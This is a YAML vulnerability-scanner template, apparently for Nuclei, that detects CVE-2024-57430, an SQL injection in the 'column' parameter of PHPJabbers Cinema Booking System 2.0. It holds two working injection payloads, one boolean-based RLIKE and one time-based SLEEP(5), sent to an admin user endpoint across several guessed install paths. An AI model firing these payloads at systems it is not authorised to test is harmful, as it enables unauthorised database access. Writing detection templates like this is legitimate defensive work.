id: cinema-booking-sqli

info:
  name: PHPJabbers Cinema Booking System v2.0 - SQL Injection
  author: ahrixia
  severity: critical
  description: |
    An SQL injection vulnerability exists in the `pjActionGetUser` function of PHPJabbers Cinema Booking System v2.0.
    The `column` parameter is vulnerable to SQL injection, allowing attackers to manipulate database queries.
    This can lead to unauthorized information disclosure, privilege escalation, or database modification.
  reference:
    - https://www.cve.org/CVERecord?id=CVE-2024-57430
    - https://www.phpjabbers.com/cinema-booking-system/
    - https://github.com/ahrixia/CVE-2024-57430
  classification:
    cve-id: CVE-2024-57430
    cwe-id: CWE-89
  metadata:
    vendor: phpjabbers
    product: cinema-booking-system
    affected-version: "2.0"
    verified: true
  tags: sqli,time-based,boolean-based,cinema-booking

variables:
  subdir: 
    - "{{BaseURL}}"
    - "{{BaseURL}}/CinemaBooking"
    - "{{BaseURL}}/CinemaBookingDev"
    - "{{BaseURL}}/booking"
    - "{{BaseURL}}/cinema"
    - "{{BaseURL}}/cinemacms"

requests:
  - method: GET
    path:
      - "{{subdir}}/index.php?controller=pjAdminUsers&action=pjActionGetUser&column=tester RLIKE (SELECT (CASE WHEN (7874=7874) THEN 0x6e616d65 ELSE 0x28 END))&direction=ASC&page=1&rowCount=10"
    
    matchers:
      - type: word
        words:
          - "tester"  # Detects boolean-based SQLi response
        part: body
      - type: status
        status:
          - 200
    condition: and

  - method: GET
    path:
      - "{{subdir}}/index.php?controller=pjAdminUsers&action=pjActionGetUser&column=name AND (SELECT 6530 FROM (SELECT(SLEEP(5)))UFOj)&direction=ASC&page=1&rowCount=10"

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"  # Confirms time-based SQL injection if response time is >= 5 seconds
    condition: or  # Triggers detection if either Boolean-based OR Time-based SQLi is found
